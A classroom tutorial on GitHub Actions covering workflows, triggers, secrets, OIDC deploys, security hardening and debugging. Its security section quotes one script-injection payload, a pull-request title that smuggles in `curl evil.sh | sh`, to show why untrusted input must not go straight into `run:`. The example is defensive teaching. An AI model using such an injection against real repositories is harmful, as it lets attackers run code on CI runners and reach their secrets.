# GitHub Actions, from zero

For: someone fine with daily git (clone, branch, commit, push, PR) and new to GitHub Actions.
Written Oct 23, 2026 during the Binary Cloud class on GitHub and code maintenance.

Versions and prices change. Every `@v4` below is the major version current when this was written; newer majors may exist, so check each action's Marketplace page. Billing numbers are marked "verify".

---

## 1. Intuition: a robot that lives in your repo

You already know event listeners from JavaScript:

```js
button.addEventListener('click', () => { doThing(); });
```

GitHub Actions is the same idea at the repo level:

```
on: push            ->  "when someone pushes"
jobs: ...           ->  "start a fresh machine and run these commands"
```

Every time something happens in the repo (a push, a pull request, a button click, a time of day), GitHub can rent a clean virtual machine for a few minutes, check out your code onto it, run the commands you wrote (build, test, lint, deploy), show you the logs, and throw the machine away.

That is all CI/CD is:
- **CI (Continuous Integration):** every change is built and tested automatically, so "works on my machine" gets caught before merge.
- **CD (Continuous Delivery / Deployment):** a change that passes is packaged and shipped to an environment automatically (or after one approval click).

Why it matters for code maintenance: humans forget to run the tests. The robot never forgets, and a red cross on a pull request stops broken code from being merged.

---

## 2. Vocabulary (learn these six words and the rest is detail)

| Word | What it is | Analogy |
|------|-----------|---------|
| **Workflow** | One YAML file in `.github/workflows/`. Describes when to run and what to run. | A recipe |
| **Event (trigger)** | What starts the workflow: `push`, `pull_request`, `schedule`, `workflow_dispatch` (manual button) ... | The doorbell |
| **Job** | A group of steps that runs on **one** machine. Jobs run **in parallel** by default. | One cook at one stove |
| **Step** | One command (`run:`) or one ready-made action (`uses:`), run in order inside a job. | One line of the recipe |
| **Action** | A reusable packaged step, e.g. `actions/checkout`. Found on the GitHub Marketplace. | A kitchen gadget someone else built |
| **Runner** | The machine that runs a job. GitHub-hosted (`ubuntu-latest`, `windows-latest`, `macos-latest`) or self-hosted (your own server). | The stove |

The hierarchy:

```
Repository
 └── .github/workflows/ci.yml        <- workflow (one per file)
       ├── on: push                   <- event
       └── jobs:
             ├── build  (runner: ubuntu-latest)      <- job, own fresh VM
             │     ├── step: checkout code           <- uses: an action
             │     ├── step: set up Java              <- uses: an action
             │     └── step: javac ...                <- run: a shell command
             └── test   (runner: ubuntu-latest)      <- another job, another fresh VM
```

Two facts beginners trip on:
1. **Each job gets a brand-new machine.** Files created in job `build` do not exist in job `test` unless you pass them (artifacts, section 10).
2. **Steps in the same job share the machine.** A file created in step 2 is visible in step 3.

---

## 3. Where it lives and how a run happens

- Workflow files must be in `.github/workflows/` at the **root** of the repo, ending in `.yml` or `.yaml`. Anywhere else, GitHub ignores them silently.
- You commit them like any other file. No server setup, nothing to install.

What happens on `git push`:

```
you: git push
        |
GitHub: "a push event happened" -> scans .github/workflows/*.yml for "on: push"
        |
        for each matching workflow -> queue its jobs
        |
        each job -> fresh runner VM -> runs steps top to bottom
        |
results: Actions tab (logs per step), a check mark or red cross on the commit / PR, email on failure
```

---

## 4. Your first workflow (do this once, by hand)

File: `.github/workflows/hello.yml`

```yaml
name: Hello                       # shown in the Actions tab

on:
  push:                           # run on every push...
  workflow_dispatch:              # ...and add a "Run workflow" button

jobs:
  say-hello:                      # job id (your choice, no spaces)
    runs-on: ubuntu-latest        # which runner
    steps:
      - name: Check out the code
        uses: actions/checkout@v4 # without this the runner has an EMPTY folder

      - name: Say hello
        run: echo "Hello from the robot. I can see these files:" && ls -la

      - name: Multi-line commands
        run: |
          echo "Branch: $GITHUB_REF_NAME"
          echo "Commit: $GITHUB_SHA"
          java -version
```

Steps to try it:
1. Create the file, commit, push.
2. Open the repo on GitHub, then the **Actions** tab.
3. Click the run, click the job, expand each step to read its log.
4. Click **Run workflow** (that is the `workflow_dispatch` button) to run it again by hand.

Things worth noticing in the log: Ubuntu runners come with Java, Node, Python, git, docker and more preinstalled, but the exact versions drift. That is why real workflows pin versions with `setup-*` actions (section 7).

---

## 5. YAML survival rules (most first-week errors are here)

- **Indentation is the syntax.** Use spaces, never tabs. Two spaces per level is the convention.
- `key: value` makes a map; `- item` makes a list item. `steps:` is a list, so every step starts with `-`.
- `|` keeps line breaks (multi-line script). Every line runs, top to bottom.
- Quote strings that look like other types: `'21'` not `21` for a Java version string, `'on'`/`'yes'` style values when in doubt.
- `#` starts a comment.

A wrong-indent example:

```yaml
steps:
  - name: Build
  run: mvn package       # WRONG: "run" is not indented under the "- name" item
```

```yaml
steps:
  - name: Build
    run: mvn package     # RIGHT: same level as "name"
```

Tip: the GitHub web editor for `.github/workflows/*.yml` underlines YAML and schema errors as you type. VS Code's "GitHub Actions" extension does the same locally.

---

## 6. Triggers (`on:`) you will actually use

```yaml
on:
  push:
    branches: [main]                 # only pushes to main
    paths: ['src/**', 'pom.xml']     # only if these files changed
  pull_request:
    branches: [main]                 # PRs that target main
  workflow_dispatch:                 # manual "Run workflow" button
    inputs:
      environment:
        description: 'Where to deploy'
        type: choice
        options: [dev, prod]
        default: dev
  schedule:
    - cron: '30 3 * * 1-5'           # 03:30 UTC Mon-Fri = 9:00 am IST
  release:
    types: [published]
```

| Trigger | Typical use |
|---------|-------------|
| `push` | Build and test every commit; deploy when main changes |
| `pull_request` | The CI gate: tests must pass before merge |
| `workflow_dispatch` | Manual jobs: deploy, cleanup, one-off scripts. Read inputs as `${{ inputs.environment }}` |
| `schedule` | Nightly builds, dependency checks, cleanup jobs |
| `release` | Build and publish artifacts when you publish a release |
| `workflow_call` | Make this workflow reusable by other workflows (section 13) |

Gotchas:
- **Cron is in UTC**, not IST. IST = UTC + 5:30. Scheduled runs can start late when GitHub is busy, and in public repos they are disabled after about 60 days without repo activity (verify).
- The **Run workflow** button only appears once the workflow file exists on the **default branch**.
- `paths:` filters mean a docs-only change does not trigger a full build. Useful in big repos.

---

## 7. Jobs and steps in depth

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15              # default is 360 (6 hours); always set something sane
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4  # install an exact Java version
        with:                        # "with" = inputs to an action
          distribution: temurin
          java-version: '21'

      - name: Compile
        run: javac -d out src/*.java
        working-directory: app       # run this step inside ./app

  test:
    needs: build                     # wait for build to succeed (sequential instead of parallel)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "runs only after build passed"

  deploy:
    needs: [build, test]
    if: github.ref == 'refs/heads/main'   # only on main, not on PR branches
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploying"
```

Key pieces:
- `uses:` runs an action; `with:` passes its inputs. `run:` runs shell commands.
- `needs:` turns parallel jobs into a pipeline. If a needed job fails, the dependent job is skipped.
- `if:` conditions work on jobs and on steps. Common ones: `if: github.event_name == 'push'`, `if: failure()` (run only when an earlier step failed, e.g. send an alert), `if: always()` (cleanup).
- On Linux runners the default `run:` shell is bash with fail-fast (`bash -e`): the first failing command fails the step. On Windows runners it is PowerShell. Override with `shell: bash` or `shell: pwsh`.
- `continue-on-error: true` lets a step fail without failing the job (use rarely).

---

## 8. Real example 1: a CI check for this repo (Java)

Goal: every push compiles every Java file under `scalar/tasks/`, so a broken file is flagged immediately.

File: `.github/workflows/java-compile.yml` (not added to the repo yet; this is practice task 2)

```yaml
name: Java compile check

on:
  push:
    paths: ['scalar/tasks/**.java']
  pull_request:
    paths: ['scalar/tasks/**.java']
  workflow_dispatch:

permissions:
  contents: read                     # least privilege: this job only reads code

jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'

      - name: Compile each file on its own
        run: |
          fail=0
          while IFS= read -r f; do
            if ! javac -d "$RUNNER_TEMP/out" "$f" 2> err.txt; then
              echo "::error file=$f::does not compile"
              cat err.txt
              fail=1
            fi
          done < <(find scalar/tasks -name '*.java')
          exit $fail
```

What the pieces mean:
- Each file is compiled alone because these are standalone solutions, not one project (that is also how they are run locally: `javac File.java`).
- `$RUNNER_TEMP` is a scratch folder on the runner, provided by GitHub.
- `::error file=...::message` is a **workflow command**: GitHub shows it as a red annotation on the run summary (and on the file in a PR).
- The loop keeps going after a failure so you see **every** broken file, then `exit $fail` fails the job if any broke.

What it would report today (dry-run locally on Oct 23: 84 files, 82 compile):
- `scalar/tasks/arrays/advanced/MinimumSwaps.java` (`return 0` in `void main`)
- `scalar/tasks/bits/BitBasics.java` (unfinished skeleton)

That is code maintenance in one picture: the robot finds the two broken files that have sat unnoticed since Oct 14.

---

## 9. Real example 2: a Node / React app (your day-job shape)

```yaml
name: Web CI

on:
  pull_request:
  push:
    branches: [main]

jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm                  # caches ~/.npm keyed on package-lock.json

      - run: npm ci                   # clean, exact install from the lockfile (not npm install)
      - run: npm run lint
      - run: npm test -- --watch=false
      - run: npm run build

      - uses: actions/upload-artifact@v4
        with:
          name: web-build
          path: dist/                 # or build/ for Create React App
          retention-days: 7
```

Why `npm ci`: it installs exactly what `package-lock.json` says and fails if the lockfile and `package.json` disagree. That is what you want in CI.

---

## 10. Matrix: one job definition, many combinations

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false               # keep the other combinations running if one fails
      matrix:
        os: [ubuntu-latest, windows-latest]
        java: ['17', '21']
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: ${{ matrix.java }}
      - run: java -version
```

That is 2 x 2 = 4 parallel jobs from one block. Use it for libraries that must work on several runtimes or operating systems. For an app with one production runtime, one combination is usually enough.

---

## 11. Variables, secrets, contexts and expressions

### Expressions `${{ }}`
Anything inside `${{ ... }}` is evaluated by GitHub **before** the step runs, then pasted into the YAML. Contexts you will use most:

| Context | Example | Gives |
|---------|---------|-------|
| `github` | `${{ github.ref_name }}`, `${{ github.sha }}`, `${{ github.actor }}`, `${{ github.event_name }}` | Info about the run, branch, commit, who triggered it |
| `env` | `${{ env.APP_NAME }}` | Variables you set with `env:` |
| `secrets` | `${{ secrets.DB_PASSWORD }}` | Encrypted secrets (masked in logs) |
| `vars` | `${{ vars.REGION }}` | Non-secret configuration variables |
| `inputs` | `${{ inputs.environment }}` | `workflow_dispatch` / `workflow_call` inputs |
| `matrix` | `${{ matrix.java }}` | The current matrix combination |
| `steps` | `${{ steps.ver.outputs.version }}` | Outputs of an earlier step in the same job |
| `needs` | `${{ needs.build.outputs.tag }}` | Outputs of a job this job depends on |

### `env:` at three levels

```yaml
env:
  APP_NAME: gita-quotes              # workflow level: every job sees it

jobs:
  build:
    env:
      STAGE: test                    # job level
    runs-on: ubuntu-latest
    steps:
      - run: echo "$APP_NAME $STAGE $GREETING"   # read as normal shell variables
        env:
          GREETING: hello            # step level
```

Inside `run:` prefer the shell form `$APP_NAME`; use `${{ env.APP_NAME }}` in places that are not shell (like `with:` or `if:`).

### Secrets and variables
- Create them in the repo: **Settings > Secrets and variables > Actions**. Secrets are encrypted and hidden; variables are plain text config.
- Read: `${{ secrets.NAME }}`, `${{ vars.NAME }}`.
- GitHub masks secret values in logs (prints `***`), but only exact matches. A secret that is transformed (base64, split) can leak. Never `echo` a secret.
- Pull requests from **forks** do not get your secrets. That is a security feature, not a bug.
- Levels: repository, environment (section 12), and organization secrets.

### `GITHUB_TOKEN` and `permissions:`
Every run gets an automatic, short-lived token called `GITHUB_TOKEN` (`${{ secrets.GITHUB_TOKEN }}`). It can talk to the GitHub API for this repo only, and it expires when the job ends. What it may do is controlled by `permissions:`:

```yaml
permissions:
  contents: read          # read code (the safe default to start from)
  pull-requests: write    # only if the workflow comments on PRs
  id-token: write         # only if it uses OIDC to log in to a cloud (section 12)
```

Rule: set `permissions:` explicitly at the top of every workflow, as small as possible. Defaults differ between older and newer repos and organizations.

### Passing data between steps and jobs

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.ver.outputs.tag }}          # expose to other jobs
    steps:
      - id: ver
        run: echo "tag=v1.0.${{ github.run_number }}" >> "$GITHUB_OUTPUT"
      - run: echo "Built ${{ steps.ver.outputs.tag }}"

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.tag }}"
```

Two special files on the runner:
- `$GITHUB_OUTPUT`: write `name=value` lines to create step outputs.
- `$GITHUB_STEP_SUMMARY`: write Markdown to show a summary on the run page (`echo "### 82/84 compiled" >> "$GITHUB_STEP_SUMMARY"`).

(The old `::set-output` command is deprecated; ignore blog posts that use it.)

---

## 12. Deploying: environments, approvals, OIDC, concurrency

### Environments
**Settings > Environments** lets you create `dev`, `staging`, `prod`, each with its own secrets and protection rules (required reviewers, wait timers, allowed branches).

```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment: prod        # pauses here until a required reviewer clicks Approve
    steps:
      - run: ./deploy.sh
```

This is how real teams get "anyone can deploy to dev, prod needs a lead's approval".

### OIDC: deploy to a cloud without storing keys
The old way: create a cloud access key, paste it into a GitHub secret. Risky: long-lived, easy to leak, painful to rotate.
The modern way: **OIDC (OpenID Connect)**. The workflow asks GitHub for a short-lived signed token that says "I am repo X, branch main"; the cloud is configured to trust that, and hands back temporary credentials. No stored keys at all.

```yaml
permissions:
  contents: read
  id-token: write                       # required for OIDC

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # GCP: Workload Identity Federation
      - uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL/providers/PROVIDER
          service_account: deployer@PROJECT_ID.iam.gserviceaccount.com
      - uses: google-github-actions/setup-gcloud@v2
      - run: gcloud run deploy my-app --source . --region asia-south1

      # AWS equivalent:
      # - uses: aws-actions/configure-aws-credentials@v4
      #   with:
      #     role-to-assume: arn:aws:iam::ACCOUNT_ID:role/github-deployer
      #     aws-region: ap-south-1
      # Azure equivalent: azure/login with client-id, tenant-id, subscription-id (federated credential)
```

The one-time cloud-side setup (create the identity pool/provider or IAM role, and restrict it to your repo and branch) is a lesson of its own; it fits next to `02_iam.md`.

### Concurrency: never run two deploys at once

```yaml
concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: true     # a newer push cancels the older, still-running run
```

For production deploys, many teams use `cancel-in-progress: false` (queue instead of cancel) so a deploy is never killed halfway.

---

## 13. Caching vs artifacts, and reusing work

### Cache vs artifact (often confused)

| | Cache | Artifact |
|--|-------|----------|
| Purpose | Speed: reuse downloaded dependencies between **runs** | Output: keep files produced by a run (build, reports) |
| Typical content | `~/.m2`, `~/.npm`, `~/.gradle` | `dist/`, `target/*.jar`, test reports |
| Action | `actions/cache@v4`, or `cache:` on `setup-node` / `setup-java` | `actions/upload-artifact@v4` / `download-artifact@v4` |
| Shared between jobs of one run? | Not the point | Yes: upload in job A, download in job B |
| Downloadable by you? | No | Yes, from the run page |

Simplest caching: let the setup action do it.

```yaml
- uses: actions/setup-java@v4
  with:
    distribution: temurin
    java-version: '21'
    cache: maven            # or gradle
```

### Three levels of reuse
1. **Marketplace actions** (`uses: owner/repo@version`): someone else's packaged step. Check stars, maintainer and recent releases before trusting one.
2. **Reusable workflows** (`on: workflow_call`): a whole workflow called from another workflow. Great for "every service in the company uses the same CI":
   ```yaml
   # caller
   jobs:
     ci:
       uses: my-org/ci-templates/.github/workflows/java-ci.yml@main
       with:
         java-version: '21'
       secrets: inherit
   ```
3. **Composite actions**: bundle several steps into your own action (`action.yml` with `runs: using: composite`). Good for repeated setup steps inside one repo.

---

## 14. Security (the part that separates seniors from tutorials)

1. **Least privilege:** `permissions: contents: read` at the top; add more only per job that needs it.
2. **Pin third-party actions.** A tag like `@v4` can be moved by the action's owner. For actions outside `actions/*` and your cloud provider's official ones, pin to a full commit SHA:
   `uses: some-org/some-action@<full 40-character commit SHA>  # v1.2.3`
   (copy the SHA from the action's release page; the comment keeps the human-readable version)
   Dependabot can keep pinned SHAs updated.
3. **Never put untrusted input directly into `run:`.** This is script injection:
   ```yaml
   # DANGEROUS: a PR title like  a"; curl evil.sh | sh; echo "  becomes shell code
   - run: echo "Title: ${{ github.event.pull_request.title }}"

   # SAFE: pass it through an environment variable
   - run: echo "Title: $TITLE"
     env:
       TITLE: ${{ github.event.pull_request.title }}
   ```
   Untrusted: PR titles and bodies, issue text, branch names, commit messages.
4. **`pull_request_target` is dangerous.** It runs with your secrets and a write token even for PRs from forks. Never check out and run the PR's code under it. Beginners should simply use `pull_request`.
5. **Prefer OIDC over stored cloud keys** (section 12). If you must store a key, scope it tightly and rotate it.
6. **Self-hosted runners on public repos** let strangers run code on your machine via PRs. Do not do it.
7. Turn on **Dependabot** (dependency updates) and **secret scanning / push protection** in repo settings. These are separate features from Actions but part of the same code-maintenance toolkit.

---

## 15. Debugging a failing workflow

Workflow did not run at all:
- File not in `.github/workflows/` at the repo root, or wrong extension.
- YAML error: the Actions tab shows "Invalid workflow file" with the line number.
- Trigger mismatch: `branches:` or `paths:` filters excluded your push; `workflow_dispatch` file not on the default branch yet.
- Actions disabled for the repo or organization (Settings > Actions).

Workflow ran and failed:
- Open the run, then the failed job, then expand the red step. The first error line is usually the real one; later errors are fallout.
- "command not found": the tool is not on the runner or not on the PATH; add a `setup-*` step.
- "Permission denied" on a script: commit it as executable (`git update-index --chmod=+x script.sh`) or run `bash script.sh`.
- Script fails with `\r` errors: the file has Windows line endings (CRLF). Add a `.gitattributes` rule (`*.sh text eol=lf`). Relevant on your Windows laptop.
- 403 when the workflow pushes or comments: missing `permissions:` for `GITHUB_TOKEN`.
- Secret is empty: wrong name (case sensitive), set in a different environment, or the run came from a fork.
- Works locally, fails in CI: different tool versions, missing env vars, timezone (runners are UTC), case-sensitive file system on Linux (`Main.java` vs `main.java`).

Tools:
- **Re-run failed jobs** button, with "Enable debug logging" for extra detail (same as adding the `ACTIONS_STEP_DEBUG` secret set to `true`).
- Add temporary `run: ls -la`, `env | sort`, `pwd` steps to see the runner's state.
- [`act`](https://github.com/nektos/act) runs workflows locally in Docker. Handy, but not identical to real runners.

---

## 16. Cost and limits (verify on GitHub's billing docs)

- **Public repos:** standard GitHub-hosted runners are free.
- **Private repos:** a monthly quota of free minutes depending on the plan (Free plan: 2,000 minutes/month at the time of writing). Windows and macOS minutes count at a higher rate than Linux (2x and 10x at the time of writing).
- A job can run at most 6 hours on GitHub-hosted runners; a whole workflow run has longer limits.
- Artifacts and caches use storage quota; set `retention-days` on artifacts.
- Habits that save minutes: `paths:` filters, `concurrency` with `cancel-in-progress` on PR builds, caching, `timeout-minutes` on every job, Linux runners unless you need Windows or macOS.

---

## 17. How it compares (for client conversations)

| Tool | Where it lives | Config | Notes |
|------|---------------|--------|-------|
| **GitHub Actions** | GitHub | `.github/workflows/*.yml` | Huge Marketplace; easiest if the code is already on GitHub |
| **GitLab CI/CD** | GitLab | `.gitlab-ci.yml` | Very similar ideas (stages, jobs, runners) |
| **Azure Pipelines** | Azure DevOps | `azure-pipelines.yml` | Common in Microsoft-stack enterprises; stages > jobs > steps |
| **Jenkins** | Your own server | `Jenkinsfile` (Groovy) | Old, flexible, plugin-heavy; you run and patch the server |
| **Google Cloud Build** | GCP | `cloudbuild.yaml` | Builds inside GCP; pairs with Cloud Run / GKE |
| **AWS CodePipeline + CodeBuild** | AWS | `buildspec.yml` | Native to AWS accounts and IAM |

The concepts transfer one to one: trigger, pipeline, job, step, runner/agent, secrets, artifacts. Learn them once here.

---

## 18. FDE angle

An FDE often lands in a client repo that has no CI, or a CI nobody trusts. The first week's highest-impact moves are usually:
1. A PR check that builds and runs the tests, plus branch protection on `main` (Settings > Branches: require the check to pass and one review).
2. Secrets moved out of code into GitHub secrets, then cloud keys replaced by OIDC.
3. One-click deploy to a dev environment (`workflow_dispatch`), with an approval gate for prod (environments).
4. Dependabot and secret scanning switched on.

Being able to say "I can have a working pipeline with a prod approval gate by tomorrow, without storing a single cloud key" is exactly the rapid-deployment credibility the role is about.

---

## 19. Cheat sheet

```yaml
name: CI
on:
  push: { branches: [main] }
  pull_request:
  workflow_dispatch:
permissions: { contents: read }
concurrency:                 # block style: ${{ }} inside { } flow braces breaks YAML
  group: ci-${{ github.ref }}
  cancel-in-progress: true
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '21', cache: maven }
      - run: mvn -B verify
```

| I want to... | Use |
|--------------|-----|
| Run on every PR | `on: pull_request` |
| Add a manual button | `on: workflow_dispatch` |
| Run at a time | `on: schedule` + `cron` (UTC) |
| Run job B after job A | `needs: A` |
| Run only on main | `if: github.ref == 'refs/heads/main'` |
| Test several versions | `strategy.matrix` |
| Speed up installs | `cache:` on the setup action, or `actions/cache` |
| Keep build output | `actions/upload-artifact` |
| Use a password | `${{ secrets.NAME }}` (never echo it) |
| Log in to a cloud | OIDC: `id-token: write` + the provider's auth action |
| Require approval for prod | `environment: prod` with required reviewers |
| Stop overlapping runs | `concurrency:` |

---

## 20. Practice ladder

| # | Task | Status |
|---|------|--------|
| 1 | Hello workflow (section 4) in a throwaway public repo; read every step's log; use the Run workflow button | open |
| 2 | Add the Java compile check (section 8) to this repo; watch it go red on the 2 broken files; fix or delete them; watch it go green | open |
| 3 | Add a `workflow_dispatch` input (`dev` / `prod` choice) and print it | open |
| 4 | Matrix: Java 17 and 21 on ubuntu and windows (4 jobs) | open |
| 5 | Node project: `npm ci`, test, build, cache, upload the `dist/` artifact, download it in a second job | open |
| 6 | Scheduled workflow at 9:00 am IST (work out the UTC cron yourself) | open |
| 7 | Branch protection on `main` requiring task 2's check; open a PR that breaks a file and see the merge blocked | open |
| 8 | Deploy the `aws/lab/gita-quotes` static page or a tiny app with OIDC (GCP Workload Identity Federation or an AWS role), no stored keys | open |

---

## 21. Self-test (answer out loud)

1. What is the difference between a workflow, a job and a step?
2. Two jobs in one workflow: do they share files? How do you pass a built JAR from one to the other?
3. Why does almost every workflow start with `actions/checkout`?
4. Your cron is `0 9 * * *`. When does it run in IST?
5. What does `needs:` change about how jobs run?
6. Cache or artifact: which for `~/.m2`, which for `target/app.jar`?
7. Why is `${{ github.event.pull_request.title }}` inside `run:` dangerous, and what is the fix?
8. What is `GITHUB_TOKEN`, how long does it live, and how do you limit it?
9. Explain OIDC deploys in two sentences to a client's security team.
10. A PR from a fork fails because a secret is empty. Bug or feature? Why?
11. Your workflow file is committed but nothing runs. Name three things to check.
12. How would you make prod deploys require a team lead's approval?
